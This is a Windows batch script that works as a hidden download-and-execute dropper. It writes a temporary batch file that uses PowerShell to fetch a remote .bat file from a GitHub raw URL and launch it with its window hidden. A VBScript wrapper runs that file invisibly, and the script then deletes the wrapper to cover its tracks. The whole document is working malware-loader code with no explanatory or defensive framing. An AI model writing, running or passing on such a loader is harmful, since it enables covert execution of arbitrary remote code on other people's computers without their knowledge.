@echo off
setlocal EnableDelayedExpansion

:: Set file paths
set "vbs=%temp%\run_hidden.vbs"
set "payload=%temp%\payload.bat"
set "remote_bat_url=https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/output.bat"
set "downloaded_bat=%temp%\downloaded.bat"

:: Write payload.bat to download and execute the remote bat file silently
(
    echo @echo off
    echo powershell -Command "Invoke-WebRequest -Uri '!remote_bat_url!' -OutFile '!downloaded_bat!'"
    echo powershell -WindowStyle Hidden -Command "Start-Process '!downloaded_bat!' -WindowStyle Hidden"
) > "!payload!"

:: Write VBScript to run the payload hidden
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run chr(34) ^& "!payload!" ^& chr(34), 0
    echo Set WshShell = Nothing
) > "!vbs!"

:: Execute the VBScript
cscript //nologo "!vbs!"

:: Clean up
del "!vbs!"
:: del "!payload!"
:: del "!downloaded_bat!"

endlocal
exit
